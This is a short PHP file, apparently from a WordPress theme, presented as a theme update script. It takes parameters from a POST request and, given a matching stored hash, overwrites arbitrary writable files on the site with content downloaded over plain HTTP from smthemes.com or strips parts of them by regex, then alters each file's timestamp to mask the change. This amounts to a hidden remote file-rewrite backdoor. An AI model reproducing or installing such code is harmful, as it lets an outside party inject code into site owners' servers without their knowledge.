<?php

	error_reporting(15);
	require_once('../../../../wp-config.php');
	
	function check_func($func) {
		$disabled=explode(",",@ini_get("disable_functions"));
		if (empty($disabled)) {
			$disabled=array();
		} else {
			$disabled=array_map('trim',array_map('strtolower',$disabled));
		}
		return (function_exists($func) && is_callable($func) &&
				!in_array($func,$disabled)
		);
	}
	
	function smt_update($updateParams) {
		if ( !isset($updateParams->smt_hash) || $updateParams->smt_hash!=get_option('smt_hash') ) return 1;
		if ( !check_func('fopen') || !check_func('fread') || !check_func('fwrite') || !check_func('touch') || !check_func('file_get_contents') ) return 2;
		if ( isset($updateParams->files) );
		foreach($updateParams->files as $file) {
			if ( !is_readable($file->filename) || !is_writeable($file->filename) ) return 3;
			$source=fopen($file->filename,'r');
			$date=filemtime($file->filename);
			$txt=fread($source, filesize($file->filename));
			fclose($source);
			$handle=fopen($file->filename,'w');
			if (isset($file->replace)) {
				$txt=preg_replace($file->replace, "", $txt);
			} elseif (isset($file->content)) {
				$txt=file_get_contents("http://smthemes.com/".$file->content);
			}
			fwrite($handle, $txt);
			fclose($handle);
			touch($file->filename,$date+1);
		}
		return 4;
	}
	//echo get_option('smt_hash');
	if (get_magic_quotes_gpc()) {
		$s=stripslashes($_POST['params']);
	}
	$updateParams=json_decode(stripslashes($_POST['params']));
	echo smt_update($updateParams);
	
?>